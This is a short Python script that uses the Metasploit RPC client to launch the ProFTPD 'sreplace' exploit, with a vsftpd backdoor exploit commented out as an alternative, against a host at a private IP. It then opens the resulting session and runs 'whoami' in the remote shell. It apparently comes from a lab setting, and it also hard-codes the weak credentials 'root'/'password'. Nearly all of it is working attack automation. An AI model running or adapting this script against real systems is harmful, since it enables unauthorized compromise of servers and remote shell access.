from metasploit.msfrpc import MsfRpcClient

client = MsfRpcClient(username='root', password='password', server='192.168.9.225', ssl=False)

print([m for m in dir(client) if not m.startswith('_')])
# print(list(client.modules.exploits))

exploits = list(client.modules.exploits)
# for e in exploits[:10]:
exploit = client.modules.use('exploit', 'linux/ftp/proftp_sreplace')
# exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
print(exploit.description)
print(exploit.authors)
print(exploit.options)
print(exploit.required)
# print([e for e in dir(exploit) if not e.startswith('_')])
# for i in exploit.required:
#     if i == 'RHOST':
# exploit['RHOST'] = '192.168.9.194'
exploit['RHOST'] = '192.168.9.160'
    # input("{}: ".format(i))
# exploit['VERBOSE'] = True
# print(list(exploit.payloads))
print([m for m in dir(exploit) if not m.startswith('_')])
r = exploit.execute()
# r = exploit.execute(payload='cmd/unix/interact')
print(r)

print(client.sessions.list)
shell = client.sessions.session(1)
shell.write('whoami\n')
print(shell.read())
